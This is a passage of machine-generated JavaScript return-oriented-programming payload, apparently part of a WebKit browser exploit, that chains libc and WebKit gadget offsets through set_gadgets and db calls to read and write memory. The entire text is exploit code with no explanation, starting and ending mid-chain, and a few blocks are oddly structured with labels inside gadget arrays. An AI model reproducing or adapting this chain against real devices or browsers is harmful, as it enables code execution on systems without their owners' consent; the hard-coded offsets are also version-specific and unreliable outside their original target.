db([17, 0]); // 0x11
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+103000, //L970
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+103016, //L971
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L970:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+103104, //L973
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L973:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103160, //L974
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L974:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103232, //L977
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L977:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103288, //L979
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L979:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103376, //L980
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L980:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L981:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+103480, //L983
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+103496, //L984
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L983:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L984:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103640, //L988
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+103608, //L986
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+103624, //L987
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L986:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L987:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L988:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103712, //L990
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L990:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+103768, //L991
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L991:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+103848, //L995
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L995:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L993:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L994:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+103952, //L996
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+103968, //L997
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L996:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L997:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+104056, //L999
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L999:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104112, //L1000
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1000:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+104216, //L1002
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1002:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1003:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+104320, //L1005
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+104336, //L1006
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1005:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1006:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104480, //L1010
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+104448, //L1008
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+104464, //L1009
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1008:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1009:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1010:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+104552, //L1012
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1012:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+104608, //L1013
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1013:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+104688, //L1017
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1017:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1015:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1016:
db([18, 0]); // 0x12
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+104792, //L1018
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+104808, //L1019
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1018:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1019:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+104896, //L1021
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1021:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104952, //L1022
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1022:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+105024, //L1025
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1025:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105080, //L1027
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1027:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1028:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+105216, //L1029
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1029:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1030:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+105320, //L1032
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+105336, //L1033
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1032:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1033:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105480, //L1037
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+105448, //L1035
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+105464, //L1036
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1035:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1036:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1037:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+105552, //L1039
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1039:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+105608, //L1040
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1040:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+105688, //L1044
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1044:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1042:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1043:
db([19, 0]); // 0x13
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+105792, //L1045
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+105808, //L1046
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1045:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1046:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+105896, //L1048
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1048:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105952, //L1049
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1049:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+106024, //L1052
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1052:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106080, //L1054
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1054:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1055:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+106216, //L1056
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1056:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1057:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+106320, //L1059
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+106336, //L1060
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1059:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106480, //L1064
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+106448, //L1062
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+106464, //L1063
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1062:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1063:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1064:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+106552, //L1066
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+106608, //L1067
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1067:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+106688, //L1071
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1071:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1069:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1070:
db([20, 0]); // 0x14
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+106792, //L1072
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+106808, //L1073
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1072:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+106896, //L1075
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1075:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106952, //L1076
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1076:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+107024, //L1079
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107080, //L1081
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1081:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1082:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+107216, //L1083
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1083:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1084:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+107320, //L1086
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+107336, //L1087
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1086:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107480, //L1091
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+107448, //L1089
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+107464, //L1090
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1089:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1090:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1091:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+107552, //L1093
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1093:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+107608, //L1094
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1094:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+107688, //L1098
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1098:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1096:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1097:
db([21, 0]); // 0x15
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+107792, //L1099
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+107808, //L1100
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1099:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1100:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+107896, //L1102
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1102:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107952, //L1103
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1103:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108024, //L1106
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1106:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108080, //L1108
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1108:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108168, //L1109
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1109:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1110:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+108272, //L1112
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+108288, //L1113
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1112:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1113:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108432, //L1117
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+108400, //L1115
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+108416, //L1116
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1115:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1116:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1117:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108504, //L1119
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1119:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+108560, //L1120
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1120:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+108640, //L1124
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1124:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1122:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1123:
db([3, 0]); // 0x3
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+108744, //L1125
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+108760, //L1126
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1125:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+108848, //L1128
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108904, //L1129
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1129:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+109008, //L1131
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1131:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1132:
db([16, 0]); // 0x10
set_gadgets([
